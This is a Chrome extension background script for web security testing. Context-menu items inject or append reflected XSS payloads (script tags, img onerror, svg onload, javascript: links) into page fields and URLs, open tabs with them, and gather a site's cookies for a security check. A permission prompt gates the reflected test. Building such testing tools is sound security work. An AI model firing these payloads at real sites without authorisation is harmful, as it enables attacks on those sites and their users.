chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "reflected-xss",
    title: "Run reflected XSS payloads",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "evaluate-url",
    title: "Evaluate url",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "create-custom-request",
    title: "Create custom request",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "map-inputs",
    title: "Map out all inputs",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "check-cookie-security",
    title: "Check cookies security",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "view-hacking-library",
    title: "View hacking library",
  });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "view-hacking-library") {
    chrome.tabs.sendMessage(tab.id, {
      action: "view hacking library",
    });
  }
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "check-cookie-security") {
    // Get the cookies first in background
    chrome.cookies.getAll({ domain: new URL(tab.url).hostname }, (cookies) => {
      // Send cookies to content script
      chrome.tabs.sendMessage(tab.id, {
        action: "check cookie security",
        cookies: cookies,
        hostname: new URL(tab.url).hostname,
      });
    });
  }
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "map-inputs") {
    chrome.tabs.sendMessage(tab.id, {
      action: "map out all inputs",
    });
  }
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "create-custom-request") {
    chrome.tabs.sendMessage(tab.id, {
      action: "Create custom request",
    });
  }
});

const PAYLOADS = {
  '<script>alert("XSS")</script>': `<script>alert("XSS")</script>`,
  "<img src=x onerror=alert(document.domain)>": `<img src=x onerror=alert(document.domain)>`,
  "<svg/onload=alert(1)>": `<svg/onload=alert(1)>`,
  '"><script>alert(1)</script>': `"><script>alert(1)</script>`,
  '"<h1>test</h1>': `"<h1>test</h1>`,
};

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "inject_xss",
    title: "Inject XSS",
    contexts: ["all"],
  });

  Object.entries(PAYLOADS).forEach(([label, payload], index) => {
    chrome.contextMenus.create({
      id: `payload_${index}`,
      title: label,
      parentId: "inject_xss",
      contexts: ["all"],
    });
  });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  const payloadIndex = parseInt(info.menuItemId.split("_")[1]);
  const payload = Object.values(PAYLOADS)[payloadIndex];

  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: (injection) => {
      const el = window.__xssTarget;
      if (!el) return alert("No element selected.");

      if (["input", "textarea"].includes(el.tagName.toLowerCase())) {
        el.value = injection;
        el.dispatchEvent(new Event("input", { bubbles: true }));
      } else if (el.isContentEditable) {
        el.innerHTML = injection;
      } else {
        alert("Selected element is not editable.");
      }
    },
    args: [payload],
  });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "evaluate-url") {
    chrome.tabs.sendMessage(tab.id, {
      action: "evaluate current url",
    });
  }
});

function runPayloads(url, payloadsToRun) {
  let payloads = [
    `<script>alert('XSS1')</script>`,
    `"><script>alert('XSS2')</script>`,
    `'><img src=x onerror=alert('XSS3')>`,
    `"><svg/onload=alert('XSS4')>`,
    `<svg><animate onbegin=alert('XSS5') attributeName=href dur=0.1s></animate></svg>`,
    `"><a href="javascript:alert('XSS6')">click</a>`,
    `%3Cscript%3Ealert('XSS7')%3C%2Fscript%3E`,
    `<svg/onload=confirm('XSS8')>`,
    `"><input autofocus onfocus=alert('XSS9')>`,
    `<body onload=alert('XSS10')>`,
  ];

  let payloadsRan = 0;

  payloads.forEach((payload) => {
    setTimeout(() => {
      if (payloadsRan < payloadsToRun) {
        let urlWithPayload = url + payload;
        chrome.tabs.create({ url: urlWithPayload });
        payloadsRan++;
      }
    }, 1000);
  });
}

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "reflected-xss") {
    chrome.tabs.sendMessage(
      tab.id,
      {
        action: "confirmUserHasPermission",
        data: "does user have permission",
      },
      function (response) {
        if (response && response.hasPermission === true) {
          runPayloads(tab.url, response.payloadsToRun);
        }
      }
    );
  }
});
